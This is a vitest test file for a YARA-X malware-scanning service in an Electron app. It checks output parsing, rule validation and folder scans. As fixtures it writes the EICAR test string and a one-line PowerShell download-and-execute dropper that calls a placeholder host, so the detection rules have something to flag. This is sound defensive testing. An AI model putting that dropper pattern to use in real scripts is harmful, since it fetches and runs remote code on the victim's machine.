import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

let dataDir: string;
vi.mock('electron', () => ({ app: { getPath: () => dataDir }, safeStorage: {} }));

import { BUILTIN_RULES, parseNdjson } from '../src/core/yara';
import { YaraService } from '../src/main/services/yara';

// Captured from the real YARA-X CLI 1.20.0 (`--output-format ndjson --print-meta --print-namespace`).
const REAL_OUTPUT = `{"path":"/t/eicar.com","rules":[{"identifier":"Blazma_EICAR_Test_File","namespace":"blazma-eicar","meta":[["description","EICAR test"],["severity","test"]],"tags":[]}]}
{"path":"/t/clean.txt","rules":[]}
`;

describe('YARA output parsing', () => {
  it('parses real YARA-X ndjson (meta as key/value pairs)', () => {
    const r = parseNdjson(REAL_OUTPUT);
    expect(r).toHaveLength(2);
    expect(r[0]!.matches[0]).toEqual({ rule: 'Blazma_EICAR_Test_File', namespace: 'blazma-eicar', tags: [], meta: { description: 'EICAR test', severity: 'test' } });
    expect(r[1]!.matches).toEqual([]);
  });
  it('ignores garbage lines and supports object-style meta', () => {
    const r = parseNdjson('warning: slow rule\n{"path":"/a","rules":[{"identifier":"X","meta":{"k":1}}]}\n{bad json\n');
    expect(r).toEqual([{ path: '/a', matches: [{ rule: 'X', namespace: 'default', tags: [], meta: { k: 1 } }] }]);
  });
  it('builtin rules never contain the full EICAR signature (so Blazma is not flagged itself)', () => {
    const all = BUILTIN_RULES.map((r) => r.source).join('\n');
    expect(all).not.toContain('X5O!P%@AP');
  });
});

// Integration tests against the REAL engine; skipped when yr is not available.
const YR = process.env.BLAZMA_TEST_YR;
describe.skipIf(!YR || !existsSync(YR))('YARA-X integration (real engine)', () => {
  let work: string;
  let svc: YaraService;
  beforeAll(() => {
    dataDir = mkdtempSync(join(tmpdir(), 'blazma-yara-'));
    work = mkdtempSync(join(tmpdir(), 'blazma-yara-t-'));
    mkdirSync(join(work, 'sub'));
    // EICAR assembled at runtime from two halves: never stored contiguously in source.
    writeFileSync(join(work, 'eicar.com'), 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$' + 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*');
    writeFileSync(join(work, 'clean.txt'), 'hello');
    writeFileSync(join(work, 'sub', 'drop.ps1'), '$c=(New-Object Net.WebClient).DownloadString("http://x"); IEX $c');
    svc = new YaraService(() => YR!);
  });
  afterAll(() => {
    rmSync(dataDir, { recursive: true, force: true });
    rmSync(work, { recursive: true, force: true });
  });

  it('detects the engine version', async () => {
    const e = await svc.engine();
    expect(e.available).toBe(true);
    expect(e.version).toMatch(/^\d+\.\d+\.\d+$/);
  });
  it('validates builtin rules with yr check', async () => {
    const rules = await svc.validateAll();
    expect(rules.length).toBe(BUILTIN_RULES.length);
    expect(rules.every((r) => r.valid === true)).toBe(true);
  });
  it('scans a folder non-recursively and recursively', async () => {
    const flat = await svc.scan(work, { recursive: false, signal: new AbortController().signal });
    expect(flat.files.find((f) => f.path.endsWith('eicar.com'))!.matches[0]!.rule).toBe('Blazma_EICAR_Test_File');
    expect(flat.files.some((f) => f.path.endsWith('drop.ps1'))).toBe(false);
    const deep = await svc.scan(work, { recursive: true, signal: new AbortController().signal });
    expect(deep.files.find((f) => f.path.endsWith('drop.ps1'))!.matches[0]!.rule).toBe('Blazma_PowerShell_Download_And_Execute');
    expect(deep.matchedFiles).toBe(2);
  });
  it('rejects an invalid custom rule and accepts a valid one', async () => {
    const bad = await svc.saveCustom('Broken', 'rule X { condition: nope_undefined }');
    expect(bad.valid).toBe(false);
    expect(bad.enabled).toBe(false);
    const good = await svc.saveCustom('Hello rule', 'rule Hello { strings: $a = "hello" condition: $a }');
    expect(good.valid).toBe(true);
    const r = await svc.scan(join(work, 'clean.txt'), { recursive: false, signal: new AbortController().signal });
    expect(r.files[0]!.matches.map((m) => m.rule)).toContain('Hello');
  });
  it('disabled rules are not used', async () => {
    await svc.setEnabled('blazma-eicar', false);
    const r = await svc.scan(join(work, 'eicar.com'), { recursive: false, signal: new AbortController().signal });
    expect(r.files[0]!.matches.map((m) => m.rule)).not.toContain('Blazma_EICAR_Test_File');
    await svc.setEnabled('blazma-eicar', true);
  });
});

describe('YARA engine missing', () => {
  it('reports not installed / missing path honestly', async () => {
    dataDir = mkdtempSync(join(tmpdir(), 'blazma-yara-none-'));
    const missing = new YaraService(() => join(dataDir, 'nope', 'yr'));
    expect(await missing.engine()).toEqual({ available: false, reason: 'yara_path_missing' });
    await expect(missing.scan('/tmp', { recursive: false, signal: new AbortController().signal })).rejects.toMatchObject({ code: 'yara_path_missing' });
    rmSync(dataDir, { recursive: true, force: true });
  });
});
